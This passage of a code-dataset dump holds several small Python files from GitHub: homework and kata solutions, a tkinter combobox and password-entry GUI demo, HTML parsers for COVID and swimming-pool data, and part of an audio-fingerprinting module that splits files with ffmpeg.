{"blob_id": "0b281d03ea9a0a92a7cdb82652e65812e7c55bce", "directory_id": "163bbb4e0920dedd5941e3edfb2d8706ba75627d", "path": "/Code/CodeRecords/2145/60708/269546.py", "content_id": "04f455752d5ae779e8aa18a822389bff6d25d85e", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "AdamZhouSE/pythonHomework", "snapshot_id": "a25c120b03a158d60aaa9fdc5fb203b1bb377a19", "revision_id": "ffc5606817a666aa6241cfab27364326f5c066ff", "branch_name": "refs/heads/master", "visit_date": "2022-11-24 08:05:22.122011", "revision_date": "2020-07-28 16:21:24", "committer_date": "2020-07-28 16:21:24", "github_id": "259576640", "star_events_count": "2", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "336", "extension": "py", "content": "N=int(input())\nfor n in range(0,N):\n    temp=input().split(\" \")\n    l=int(input())\n    list=[]\n    for item in temp:\n        list.append(int(item))\n    maxresult=0\n    for x in range(1,l+1):\n        for y in range(0,l-x+1):\n            h=min(list[y:y+x])\n            if(h*x>maxresult):\n                maxresult=h*x\n    print(maxresult)"}
{"blob_id": "45eebe5d880038e043efa6c638fc52e62efeafc0", "directory_id": "e8336350c67dc99636357e01353b65cf0c1719ee", "path": "/23.12.2019/reversed.py", "content_id": "727a66be074d3fce6410363524a593616366d86e", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "DogForMoon/pythontasks", "snapshot_id": "fe41bdd3141c9ca7cb636fc254bdd1cc97292706", "revision_id": "fdfd74418f55f154b80699e1b7af45acd9a94cab", "branch_name": "refs/heads/master", "visit_date": "2020-11-25 01:33:37.685028", "revision_date": "2020-01-14 18:44:33", "committer_date": "2020-01-14 18:44:33", "github_id": "228431387", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "179", "extension": "py", "content": "def solution(string):\n    answer = list(string)\n    answer.reverse()\n    answer_str = ''.join(answer)\n    return answer_str\n#https://www.codewars.com/kata/5168bb5dfe9a00b126000018"}
{"blob_id": "5166b62d79e8a1f03e026f7d7d68aea06c13e45e", "directory_id": "a07ff16550397b3433a185da34cc19379da31c26", "path": "/day02/if_01.py", "content_id": "7242a5e344a236f763e907bb212d3d755cb5ceed", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "gangys0411/python", "snapshot_id": "c349dc5be41488e4632bd775925bc503b61067be", "revision_id": "dd6a2c5cd4e25cfe0442fe8d3f97ca0444e789b7", "branch_name": "refs/heads/master", "visit_date": "2020-06-08 06:37:47.671495", "revision_date": "2019-07-11 13:55:23", "committer_date": "2019-07-11 13:55:23", "github_id": "193178789", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "113", "extension": "py", "content": "input_name = \"\uac15\uc601\uc11d\"\n\nif input_name == \"\uac15\uc601\uc11d\":\n    print(\"\ub9cc\ub098\uc11c \ubc18\uac11\uc2b5\ub2c8\ub2e4,\", input_name)\n    \n"}
{"blob_id": "8b53190609f233ce8b7f1dcc1a89c211d4724409", "directory_id": "ab764e56a7391f9de745552efb4520c2cb1fef2a", "path": "/program_07b.py", "content_id": "c5973b7d9469489d8a7af6be16dd627d33d8402e", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "irsbugs/ttk_demos", "snapshot_id": "54da2125f9fb1533a2c49aeabd79d1da34b5f606", "revision_id": "6142bbf8a2e28be4f209930c9239fbf0a06316e8", "branch_name": "refs/heads/master", "visit_date": "2021-01-10 10:21:20.398648", "revision_date": "2016-02-19 10:36:49", "committer_date": "2016-02-19 10:36:49", "github_id": "50483548", "star_events_count": "0", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "19835", "extension": "py", "content": "#!/usr/bin/env python3\n#\n# Program:      program_07b.py\n#\n# Objective:    GUI application template using buttons and labels\n#               Use same overall layout as program_01.py\n#               Introduce ttk.Combobox with LabelFrames\n#               Add Scrollbar - with read-write ability\n#               Command line option 1 sets the default values\n#\n# Written for:  Hamilton Python User Group - Presentation xxx 2016\n#               https://github.com/hampug\n#               http://www.meetup.com/nzpug-hamilton/\n#\n# Author:       Ian Stewart\n#\n# Date:         2016-Feb-19\n#\n# Copyright:    This work is licensed under a Creative Commons\n#               Attribution-ShareAlike 4.0 International License.\n#               http://creativecommons.org/licenses/by-sa/4.0/\n#\n# Notes:\n# 1. Indentation method: 4 x space characters per indentation\n# 2. *** indicates changes in this program over previous revision.\n# Python modules to be imported. Plus checking\nimport sys\nimport os\n\n# Check Python is version 3\nif int(sys.version[0]) < 3:\n    print(\"Python Version Error: Run program using python3 to support \"\n          \"tkinter.\\nExiting...\")\n    sys.exit()\n# Import tkinter and ttk modules\ntry:\n    from tkinter import *\nexcept ImportError as e:\n    print(\"Import Error: tkinter module for python3 is not available.\")\n    print(\"To install tikinter: $ sudo apt-get install python3-tk\")\n    sys.exit()\ntry:\n    from tkinter import ttk\nexcept ImportError as e:\n    print(\"Import Error: tkinter.ttk module is not available.\")\n    print(\"To install tikinter: $ sudo apt-get install python3-tk\")\n    sys.exit()\n\n# Define Constants:\nPROGRAM = \"program_07b.py\"\nVERSION = \"2.0\"\nTITLE_1 = \"GUI Application. {} {}\".format(PROGRAM, VERSION)\nTITLE_2 = \"Launching tkinter/ttk application. {} {}\".format(PROGRAM, VERSION)\nINFO_1 = (\"Combobox that is readwrite,  with Scrollbar.\\n\"\n          \"Option of 1 will launch with pre-selected data.\")\nINFO_2 = \"The command line argument was \"\nBUTTON_1_TEXT = \"Submit\"\nCLOSE_TEXT = \"Close\"\n# Define Variables:\nargument_1 = 0  # For command line first argument (sys.argv[1]).\n# Main GUI application\n\n\nclass GUI_Application_Feature(ttk.Frame):\n\n    \"\"\"Main GUI for the featured functionality\"\"\"\n\n    def __init__(self, parent, argument):\n        ttk.Frame.__init__(self, parent)\n        # Method of packing main ttk.Frame\n        self.pack(expand=Y, fill=BOTH)\n        # self.grid(row=0, column=0)\n        # Pack options:  after, anchor, before, expand, fill, in_, ipadx,\n        #                 ipady, padx, pady, side.\n        # Grid options:  column, columnspan, in_, ipadx, ipady, padx, pady,\n        #                 row, rowspan, sticky\n        self.master.title(TITLE_1)\n        self.create_feature_widgets(argument)\n\n    def create_feature_widgets(self, argument):\n        \"\"\"Setup variables, style, widgets for appearance on launching\"\"\"\n        # *** Set Int variable for Checkbutton set 1\n        self.combobox_1_text = StringVar()\n        # *** Set Int variable for Checkbutton set 2\n        self.entry_2_text = StringVar()\n\n        # Drop down list for combobox\n        self.combobox_1_list = [\"root\", \"admin\", \"guest\", \"bob\", \"fred\",\n                                \"mary\", \"molly\", \"polly\", \"dolly\", \"wally\",\n                                \"supercalifragilisticexpialidocious\"]\n        # Sort the list\n        self.combobox_1_list = sorted(self.combobox_1_list)\n\n        # ===== Create styles for use with ttk widgets =====\n        self.style = ttk.Style()\n\n        # Change a root style to modify all widgets.\n        self.style.configure('.', font=('FreeSans', 12))\n\n        # Create a Blue style for the label. Use when value 0\n        self.style.configure('blue.TLabel', foreground='white',\n                             background='#0000ff', font=('FreeSans', 16),\n                             padding=10)\n\n        self.style.configure('cyan.TFrame', borderwidth=5, relief=\"ridge\",\n                             background='#00ffff')\n\n        self.style.configure('grey.TEntry', foreground='grey', padding=5)\n\n        self.style.configure('black.TEntry', foreground='black', padding=5)\n\n        # ===== Create Widgets =====\n        # Create Frames\n        # Frame1. Relief = \"sunken\" \"flat\" \"groove\" \"ridge\" \"raised\"\n        self.frame_1 = ttk.Frame(self, style='cyan.TFrame',\n                                 padding=\"5 5 5 5\")\n\n        # Create Label Frame for entry_1\n        self.labelframe_1 = ttk.Labelframe(self, text=\"Account (lower case)\")\n\n        # Create Combobox_1  # ***\n        # Use register to define functions to validate and process invalid\n        self.combobox_1 = ttk.Combobox(\n            self.labelframe_1,\n            textvariable=self.combobox_1_text,\n            height=10,\n            width=10,  # default = 20\n            validate='key',\n            state=\"readwrite\",  # readonly\n            values=self.combobox_1_list,\n            invalidcommand=(\n                self.register(self.is_invalid_combo_1), '%W', '%P'),\n            validatecommand=(self.register(self.is_valid_combo_1), '%P')\n            )\n\n        # To have a default value from the list selected.\n        # self.combobox_1.current(0)  # First item\n        # self.combobox_1.current(len(self.combobox_1_list)-1)  # Last item\n\n        # Add a Scrollbar for the combobox_1\n        self.scrollbar_1 = ttk.Scrollbar(self.labelframe_1,\n                                         orient=\"horizontal\",\n                                         command=self.combobox_1.xview)\n        # Link combobox_1 to the scrollbar\n        self.combobox_1.config(xscrollcommand=self.scrollbar_1.set)\n\n        # Place Combobox and ascrollbar into labelframe\n        self.combobox_1.grid(in_=self.labelframe_1, row=0, column=0, padx=5,\n                             pady=5,\n                             )\n        self.scrollbar_1.grid(in_=self.labelframe_1, row=1, column=0, padx=5,\n                              pady=5, sticky=\"ew\"\n                              )\n\n        # Create Label Frame for entry_2\n        self.labelframe_2 = ttk.LabelFrame(self, text=\"Password\")\n        # Create Entry_2 as though it is a password:\n        self.entry_2 = ttk.Entry(self.labelframe_2,\n                                 textvariable=self.entry_2_text,\n                                 show=\"*\"\n                                 )\n        # Setup the entry_2 inside the label_frame_2\n        # self.entry_1.pack(fill=X, expand=Y, padx='1m', pady='1m')\n        self.entry_2.grid(in_=self.labelframe_2, row=0, column=0, padx=5,\n                          pady=5,)\n\n        # Create Labels:\n        # label_1 - Main label to display the status of the switches\n        self.label_1 = ttk.Label(self.frame_1, text=\"\", style='blue.TLabel')\n        # Add label_1 into frame_1\n        self.label_1.grid(row=0, column=0, sticky=\"WE\")\n\n        # Button_1 Submit the data\n        self.button_1 = ttk.Button(self, text=BUTTON_1_TEXT,\n                                   command=self.button_1_cb)\n\n        # ===== Add frames to main grid =====\n        # ***\n        self.labelframe_1.grid(row=1, column=0, padx=10, pady=5, sticky=\"w\")\n        self.labelframe_2.grid(row=2, column=0, padx=10, pady=5, sticky=\"w\")\n\n        # self.entry_2.grid(row=2, column=0, padx=10, pady=5, sticky=\"w\")\n        # self.checkbutton_2.grid(row=2, column=0, padx=10, pady=5, sticky=W)\n        self.frame_1.grid(row=0, column=0, columnspan=3, padx=5, pady=5)\n        self.button_1.grid(row=4, column=0, padx=5, pady=5, sticky=\"w\")\n\n        # ===== Initial Setup =====\n        # Setup default value of combobox based on argument.\n        if argument >= 0 and argument < len(self.combobox_1_list):\n            self.combobox_1.current(argument)\n        # ===== End of all widget creation and setup =====\n\n    # ===== Widget call backs =====\n    def is_valid_combo_1(self, txt):\n        \"\"\"Check that text is alphabetical and lower case, or nothing\"\"\"\n        if txt == \"\":  # Allow nothing so that all characters can be deleted\n            return True\n\n        if txt.isalpha():\n            if txt.islower():\n                return True\n            else:\n                return False\n        else:\n            return False\n\n    def is_invalid_combo_1(self, widget_name, txt):\n        \"\"\"Called whenever is_valid_entry_1() returns false\"\"\"\n        # non-lowercase letters have been prevented from being added to entry_1\n        # Make the bell warning sound\n        # >>> [m for m in dir(str) if m.startswith('is')]\n        # ['isalnum', 'isalpha', 'isdigit', 'islower', 'isspace', 'istitle',\n        #  'isupper']\n        widget = self.nametowidget(widget_name)\n        widget.bell()\n        widget.focus_set()\n\n    def button_1_cb(self):\n        \"\"\"Submit all data top the label\"\"\"\n        # print(self.entry_1_text.get())\n        self.label_1.config(text=\"{},{}\".format(\n                            self.combobox_1_text.get(),\n                            self.entry_2_text.get()\n                            ))\n        # Change from Grey to Black font in Entry_1\n        # self.entry_1.configure(style='black.TEntry')\n\n\ndef main_program_action(label_1):\n    \"\"\"\n    This is the main section of program code. It has been placed outside of\n    the GUI_Application() class.\n    \"label_1\" is the self.label_1 in the GUI_Applications class. It is passed\n    to this function so that the labels text can be changed.\n    \"\"\"\n    # Not worth passing the data out of the class.\n    pass\n\n\nclass GUI_Application_Standard(ttk.Frame):\n\n    \"\"\"Main GUI for the standard functionality\"\"\"\n\n    def __init__(self, parent, argument):\n        ttk.Frame.__init__(self, parent)\n        # Method of packing main ttk.Frame\n        self.pack(expand=Y, fill=BOTH)\n        # self.grid(row=1, column=0)\n\n        self.master.title(TITLE_1)\n        self.create_standard_widgets(argument)\n\n    def create_standard_widgets(self, argument):\n        \"\"\"Setup the style, widgets and initial appearance on launching\"\"\"\n\n        # ===== Create styles for use with ttk widgets =====\n        self.style = ttk.Style()\n        # Change a root style to modify all widgets.\n        self.style.configure('.', font=('FreeSans', 12))\n\n        # ===== Create Widgets =====\n        # Create Frame1 to place around labesl and close buttons  # ***\n        self.frame_1 = ttk.Frame(self, padding=\"10 10 10 10\", borderwidth=5,\n                                 relief=\"ridge\")\n        # Frame within a frame for a close button  # ***\n        self.frame_2 = ttk.Frame(self.frame_1,\n                                 padding=\"10 10 10 10\", borderwidth=5,\n                                 relief=\"ridge\")\n\n        # Create Labels:\n        # label_1 - Program description\n        self.label_1_standard = ttk.Label(self.frame_1, text=INFO_1)\n        # label_2 - State the argument if one was passed.\n        self.label_2_standard = ttk.Label(self.frame_1,\n                                          text=('{} \"{}\".'.format(INFO_2,\n                                                                  argument)))\n        # label_3 - Python version number. Retrieved by calling function.\n        self.label_3_standard = ttk.Label(self.frame_1,\n                                          text=get_python_version())\n\n        # Create Buttons:\n        # Button to Close\n        self.button_1_standard = ttk.Button(self.frame_2, text=CLOSE_TEXT,\n                                            command=self.button_1_standard_cb)\n\n        # ===== Add widgets to grid =====\n        # Labels\n        self.label_1_standard.grid(row=0, column=0, columnspan=3, padx=5,\n                                   pady=5, sticky=\"w\")\n        self.label_2_standard.grid(row=1, column=0, columnspan=3, padx=5,\n                                   pady=5, sticky=\"w\")\n        self.label_3_standard.grid(row=2, column=0, columnspan=3, padx=5,\n                                   pady=5, sticky=\"w\")\n        # Buttons\n        # Add Close Button into its own frame, frame2\n        self.button_1_standard.grid(row=0, column=0)\n\n        # Frames\n        # Add frame2 (with button) into frame1  # ***\n        self.frame_2.grid(row=3, column=2, sticky=\"e\")\n\n        # Add master frame1 to the main ttk.frame at bottom  # ***\n        self.frame_1.grid(row=1, column=0)\n        # ===== End of all standard widget creation and setup =====\n\n    def button_1_standard_cb(self):\n        \"\"\"Callback from close button to close the GUI application\"\"\"\n        sys.exit()\n\n\ndef get_python_version():\n    \"\"\"\n    Function to retrieve the python version.\n    The python version number is the string of characters before the first\n    space in the string returned from the function sys.version().\n    E.g. \"3.4.0\"\n    >>> sys.version\n    '3.4.0 (default, Apr 11 2014, 13:05:11) \\n[GCC 4.8.2]'\n    \"\"\"\n    python_version = sys.version.split(\" \")[0]\n    return \"Python version: {}.\".format(python_version)\n\nif __name__ == \"__main__\":\n    \"\"\"Check for command line argument. Launch GUI\"\"\"\n    if len(sys.argv) > 1:\n        argument_1 = sys.argv[1]\n    else:\n        argument_1 = 0\n    # Provide help\n    if argument_1 == \"-h\" or argument_1 == \"--help\":\n        print(\"{} V{}. {}\\n{}\\n\"\n              \"Use option --copy2bin create launchable program.\"\n              .format(PROGRAM, VERSION, sys.argv[0], INFO_1))\n        sys.exit()\n    # Provide copy to /usr/local/bin/\n    if argument_1 == \"--copy2bin\":\n        try:\n            from copy2bin import copy_to_bin\n            copy_to_bin(sys.argv[0])\n            sys.exit()\n        except ImportError:\n            print(\"ImportError: from copy2bin import copy_to_bin\")\n            print(\"Place copy2bin.py into \"\n                  \"/usr/local/lib/python3.4/dist-packages/\")\n            sys.exit()\n    # Pass a value to launch program. Or 0 if no value.\n    try:\n        argument_1 = int(argument_1)\n    except ValueError:\n        # If not an integer then force to a value of 0\n        argument_1 = 0\n\n    print(TITLE_2)\n    # Launch tkinter GUI.\n    root = Tk()\n    # Force the geometry of the GUI width x height + position x + position y\n    # root.geometry('400x180+50+100')\n    # Open the two GUI Application class.\n    main_gui = GUI_Application_Feature(root, argument_1)\n    main_gui = GUI_Application_Standard(root, argument_1)\n    root.mainloop()  # Tells Tk to enter its event loop.\n\n\"\"\"\nNotes:\n\n=====\nReferences:\nhttp://infohost.nmt.edu/tcc/help/pubs/tkinter/web/ttk-Combobox.html\nhttp://pyinmyeye.blogspot.co.nz/2012/08/tkinter-entry-with-validation-demo.html\nhttp://www.tcl.tk/man/tcl8.4/TkCmd/entry.htm#M12\nhttp://effbot.org/zone/tkinter-entry-validate.htm\nhttp://stupidpythonideas.blogspot.co.nz/2013/12/tkinter-validation.html\nhttp://stackoverflow.com/questions/18741078/ttk-entry-widget-validate-entry-invalid-text-entry-does-not-cause-reverting\nhttp://stackoverflow.com/questions/4140437/interactively-validating-entry-widget-content-in-tkinter\nhttp://stackoverflow.com/questions/17635905/ttk-entry-background-colour\nhttp://infohost.nmt.edu/tcc/help/pubs/tkinter/web/ttk-Checkbutton.html\nhttps://python-textbok.readthedocs.org/en/1.0/Introduction_to_GUI_Programming.html\nhttp://infohost.nmt.edu/tcc/help/pubs/tkinter/web/ttk-Checkbutton.html\nhttps://python-textbok.readthedocs.org/en/1.0/Introduction_to_GUI_Programming.html\nhttp://stackoverflow.com/questions/17125842/python-3-tkinter-change-label-text\nhttps://www.tcl.tk/man/tcl8.5/TkCmd/contents.htm\nhttp://infohost.nmt.edu/tcc/help/pubs/tkinter/web/ttk-element-layer.html\nhttp://infohost.nmt.edu/tcc/help/pubs/tkinter/web/ttk-layouts.html\nhttp://infohost.nmt.edu/tcc/help/pubs/tkinter/web/ttk-map.html\n\n=====\n\n#     valid percent substitutions (see first link above)\n#         %d = Type of action (1=insert, 0=delete, -1 for others)\n#         %i = index of char string to be inserted/deleted, or -1\n#         %P = value of the entry if the edit is allowed\n#         %s = value of entry prior to editing\n#         %S = the text string being inserted or deleted, if any\n#         %v = the type of validation that is currently set\n#         %V = the type of validation that triggered the callback\n#              (key, focusin, focusout, forced)\n#         %W = the tk name of the widget\n\n=====\nSetup the program so it can be launched from the command line:\nLinux Instructions:\nNote: Requires first line to be the shebang. E.g. #!/usr/bin/env python3\n\nTo convert a program so it can be run from the linux bash command line...\nCopy to /usr/local/bin/ stripping the \".py\" extension. Renaming if desired.\n$ sudo cp python_file_name.py /usr/local/bin/program_name\nE.g. $ sudo cp python_octal_calculator_v3.py /usr/local/bin/octalcalc\n\nSet file to be executable.\n$ sudo chmod +x /usr/local/bin/program_name\nE.g. $ sudo chmod +x /usr/local/bin/octalcalc\n\nLaunch the program.\n$ program_name\nE.g. $ octalcalc\n\nExample:\n$ sudo cp program_01.py /usr/local/bin/program1\n$ sudo chmod +x /usr/local/bin/program1\n$ ls -l /usr/local/bin/program1\n-rwxr-xr-x 1 root root 8702 Jan 27 10:50 /usr/local/bin/program1\n$ program1\n\n=====\n#Obtaining TLabel options...\nstyle = ttk.Style()\nprint(\"TLabel layout:\\n{}\".format(style.layout('TLabel')))\nprint(\"TLabel.border:\\n{}\".format(style.element_options('TLabel.border')))\nprint(\"TLabel.padding:\\n{}\".format(style.element_options('TLabel.padding')))\nprint(\"TLabel.label:\\n{}\".format(style.element_options('TLabel.label')))\nsys.exit()\n\n        # Obtain information of TWidgets layout and element_options, etc\n        # print(\"TButton layout:\\n{}\".format(self.style.layout('TButton')))\n        # print(\"TFrame layout:\\n{}\".format(self.style.layout('TFrame')))\n        # [('Frame.border', {'sticky': 'nswe'})]\n        # Frame.border\n        # print(\"TFrame.border:\\n{}\"\n        #      .format(self.style.element_options('TFrame.border')))\n        # ('-background', '-borderwidth', '-relief')\n\nTLabel layout:\n[('Label.border', {'sticky': 'nswe', 'children':\n    [('Label.padding', {'sticky': 'nswe', 'children':\n        [('Label.label', {'sticky': 'nswe'})],\n    'border': '1'})],\n'border': '1'})]\n\nTLabel.border:\n('-background', '-borderwidth', '-relief')\nTLabel.padding:\n('-padding', '-relief', '-shiftrelief')\nTLabel.label:\n('-compound', '-space', '-text', '-font', '-foreground', '-underline',\n'-width', '-anchor', '-justify', '-wraplength', '-embossed', '-image',\n'-stipple', '-background')\n\n=====\n#Obtaining TButton options...\nstyle = ttk.Style()\nprint(\"TButton layout:\\n{}\".format(style.layout('TButton')))\nprint(\"TButton.border:\\n{}\".format(style.element_options('TButton.border')))\nprint(\"TButton.focus:\\n{}\".format(style.element_options('TButton.focus')))\nprint(\"TButton.padding:\\n{}\".format(style.element_options('TButton.padding')))\nprint(\"TButton.label:\\n{}\".format(style.element_options('TButton.label')))\nsys.exit()\n\nTButton layout:\n[('Button.border', {'children':\n    [('Button.focus', {'children':\n        [('Button.padding', {'children':\n            [('Button.label', {'sticky': 'nswe'})],\n        'sticky': 'nswe'})],\n    'sticky': 'nswe'})],\n'sticky': 'nswe', 'border': '1'})]\n\nTButton.border:\n('-background', '-borderwidth', '-relief')\nTButton.focus:\n('-focuscolor', '-focusthickness')\nTButton.padding:\n('-padding', '-relief', '-shiftrelief')\nTButton.label:\n('-compound', '-space', '-text', '-font', '-foreground', '-underline',\n'-width', '-anchor', '-justify', '-wraplength', '-embossed', '-image',\n'-stipple', '-background')\n\n=====\nExamples of performing a lookup on a style option.\nprint(\"TLabel border background colour: {}\"\n      .format(style.lookup('TLabel.border', 'background')))\n\nTLabel border background colour: #d9d9d9\n\nprint(\"TLabel border borderwidth: {}\"\n      .format(style.lookup('TLabel.border', 'borderwidth')))\n\nTLabel border borderwidth: 1\n\n         1         2         3         4         5         6         7        7\n1234567890123456789012345678901234567890123456789012345678901234567890123456789\n\n\"\"\"\n"}
{"blob_id": "6a5f22e8014f30cf448c7990c98bb5ef6ed69081", "directory_id": "f73ce81b31fb0b161a457033dabfb688172dd658", "path": "/covid/html_parsers.py", "content_id": "3e8641d7f7d4c20c32e5cd01abd0a015906b06aa", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Lechy901/CovidAPI", "snapshot_id": "5d80ce6a79338d1287d37d695bca5e10a79562a5", "revision_id": "9bf2687c41be81a93690362321ee13073d695c83", "branch_name": "refs/heads/master", "visit_date": "2021-04-17 00:22:25.623355", "revision_date": "2020-03-23 10:07:04", "committer_date": "2020-03-23 10:07:04", "github_id": "249395646", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "881", "extension": "py", "content": "\r\nfrom html.parser import HTMLParser\r\n\r\nclass CovidParser(HTMLParser):\r\n    def __init__(self):\r\n        HTMLParser.__init__(self)\r\n        self.follows_cz = 0\r\n        self.first = True\r\n\r\n    def handle_data(self, data):\r\n        if not self.first:\r\n            return\r\n        if self.follows_cz > 0:\r\n            self.follows_cz -= 1\r\n            if self.follows_cz == 0:\r\n                self.data = data\r\n                self.first = False\r\n        elif (\"Czechia\" in data):\r\n            self.follows_cz = 2\r\n\r\nclass BazenParser(HTMLParser):\r\n    def __init__(self):\r\n        HTMLParser.__init__(self)\r\n        self.follows = 0\r\n\r\n    def handle_data(self, data):\r\n        if self.follows > 0:\r\n            self.follows -= 1\r\n            if self.follows == 0:\r\n                self.data = data\r\n        elif (\"Plaveck\u00c3\u00bd baz\u00c3\u00a9n: \" in data):\r\n            self.follows = 1\r\n"}
{"blob_id": "7f67fa01a9706d76c046c5f0222045ed6c9d0417", "directory_id": "9db3285eea2f71a17a3bb643407c68129ac654e2", "path": "/dejavu/__init__.py", "content_id": "77033156314ffaf0759fa1d92050a4cfae09418b", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "IskrenStanislavov/django-tv-snax", "snapshot_id": "cf70a2dc1cf0eed344a503c1c56a60aa9967a3e6", "revision_id": "4df5289d599155d59cd8ca3e4ddad3a2cb0ddd5b", "branch_name": "refs/heads/master", "visit_date": "2020-04-25 06:11:34.274297", "revision_date": "2019-02-28 09:46:54", "committer_date": "2019-02-28 09:46:54", "github_id": "172571926", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "10476", "extension": "py", "content": "from dejavu.database import get_database\nimport dejavu.decoder as decoder\nimport fingerprint\nimport multiprocessing\nimport os\nimport traceback\nimport sys\n\nimport shutil\nimport subprocess\nimport os.path\nfrom dejavu.decoder import get_duration\n\nclass SplitError(Exception):\n    def __init__(self, file_path, output_file, error_code):\n        Exception.__init__(self)\n        self.file_path = file_path\n        self.error_code = error_code\n        self.output_file = output_file\n\n    def __str__(self):\n        return \"Spliting of file({0}) failed to ({1}). ffmpeg returned error code: {2}\".format(self.file_path, self.output_file, self.error_code)\n\nclass Dejavu(object):\n\n    SONG_ID = \"audio_id\"\n    SONG_NAME = 'name'\n    CONFIDENCE = 'confidence'\n    MATCH_TIME = 'match_time'\n    OFFSET = 'offset'\n    OFFSET_SECS = 'offset_seconds'\n\n    SPLIT_DIR = \"split_dir\"\n    OVERWRITE_WHEN_SPLITING = 1\n\n    def __init__(self, config):\n        super(Dejavu, self).__init__()\n\n        self.config = config\n\n        # initialize db\n        db_cls = get_database(config.get(\"database_type\", None))\n\n        self.db = db_cls(**config.get(\"database\", {}))\n        self.db.setup()\n\n        # if we should limit seconds fingerprinted,\n        # None|-1 means use entire track\n        self.limit = self.config.get(\"fingerprint_limit\", None)\n        if self.limit == -1:  # for JSON compatibility\n            self.limit = None\n        self.get_fingerprinted_songs()\n\n    def get_fingerprinted_songs(self):\n        # get songs previously indexed\n        # TODO: should probably use a checksum of the file instead of filename\n        self.songs = self.db.get_songs()\n        self.songnames_set = set()  # to know which ones we've computed before\n        for song in self.songs:\n            song_name = song[self.db.FIELD_SONGNAME]\n            self.songnames_set.add(song_name)\n\n    def fingerprint_directory(self, path, extensions, nprocesses=None, splited=False, splited_song_name=\"\"):\n        # Try to use the maximum amount of processes if not given.\n        try:\n            nprocesses = nprocesses or multiprocessing.cpu_count()\n        except NotImplementedError:\n            nprocesses = 1\n        else:\n            nprocesses = 1 if nprocesses <= 0 else nprocesses\n\n        pool = multiprocessing.Pool(nprocesses)\n\n        filenames_to_fingerprint = []\n        for filename, _ in decoder.find_files(path, extensions):\n\n            # don't refingerprint already fingerprinted files\n            if decoder.path_to_songname(filename) in self.songnames_set:\n                print \"%s already fingerprinted, continuing...\" % filename\n                continue\n\n            filenames_to_fingerprint.append(filename)\n\n        # Prepare _fingerprint_worker input\n        worker_input = zip(filenames_to_fingerprint,\n                           [self.limit] * len(filenames_to_fingerprint))\n\n        # Send off our tasks\n        iterator = pool.imap_unordered(_fingerprint_worker,\n                                       worker_input)\n\n        if splited and splited_song_name:\n            sid = self.db.insert_song(splited_song_name)\n\n        # Loop till we have all of them\n        while True:\n            try:\n                song_name, hashes = iterator.next()\n            except multiprocessing.TimeoutError:\n                continue\n            except StopIteration:\n                break\n            except:\n                print(\"Failed fingerprinting\")\n                # Print traceback because we can't reraise it here\n                traceback.print_exc(file=sys.stdout)\n            else:\n                if not splited:\n                    sid = self.db.insert_song(song_name)\n                self.db.insert_hashes(sid, hashes)\n                self.db.set_song_fingerprinted(sid)\n                self.get_fingerprinted_songs()\n\n        pool.close()\n        pool.join()\n\n    def fingerprint_with_duration_check(self, input_file, minutes=5, song_name=None, processes=None):\n        duration = get_duration(input_file)\n        split_length =  minutes * 60\n        if duration < split_length:\n            return self.fingerprint_file(input_file)\n        songname, extension = os.path.splitext(os.path.basename(input_file))\n        song_name = song_name or songname\n        # don't refingerprint already fingerprinted files\n        if song_name in self.songnames_set:\n            print \"%s already fingerprinted, continuing...\" % song_name\n            return\n        file_directory = os.path.dirname(input_file)\n        output_split_path = os.path.join(file_directory, self.SPLIT_DIR)\n        try:\n            os.mkdir(output_split_path)\n        except WindowsError:\n            pass\n        output_path = os.path.join(output_split_path, song_name)\n        try:\n            os.mkdir(output_path)\n        except WindowsError:\n            pass\n\n        start_offset = 0\n        end_offset = split_length\n        retcode = 0\n        sid = self.db.insert_song(song_name)\n        while start_offset < duration:\n            output_file = os.path.join(output_path, \"start_sec{0}_end_sec{1}{2}\".format(start_offset, end_offset, extension))\n            convertion_command = [ 'ffmpeg',\n                                    '-i', input_file,\n                                    \"-acodec\", \"copy\", #fastest convertion possible 1:1 copy\n                                    [\"-n\",\"-y\"][self.OVERWRITE_WHEN_SPLITING],  # always overwrite existing files\n                                    \"-vn\",  # Drop any video streams if there are any\n                                    '-ss', str(start_offset),\n                                    '-t', str(split_length),\n                                    output_file]\n            #songname for the input\n            retcode = subprocess.call(convertion_command, stderr=open(os.devnull))\n            if retcode != 0:\n                raise SplitError(input_file, output_file, retcode)\n            start_offset += split_length\n            end_offset += split_length\n            end_offset = min(end_offset, duration)\n\n            # song_name = song_name or songname\n            # song_name, hashes = _fingerprint_worker(output_file,\n            #                                         self.limit,\n            #                                         song_name=song_name)\n            # self.db.insert_hashes(sid, hashes)\n        self.db.set_song_fingerprinted(sid)\n        self.get_fingerprinted_songs()\n        self.fingerprint_directory(output_path, [extension], nprocesses=processes, splited=True, splited_song_name=song_name)\n        try:\n            shutil.rmtree(\"./split/\")\n        except WindowsError:\n            pass\n        return sid\n\n\n\n    def is_fingerprinted(self, song_name):\n        if song_name in self.songnames_set:\n            return True\n        return False\n\n    def fingerprint_file(self, filepath, song_name=None):\n        if self.is_fingerprinted(song_name):\n            raise Exception(\"Already fingerprinted\");\n        song_name, hashes = _fingerprint_worker(filepath,\n                                                self.limit,\n                                                song_name=song_name)\n\n        sid = 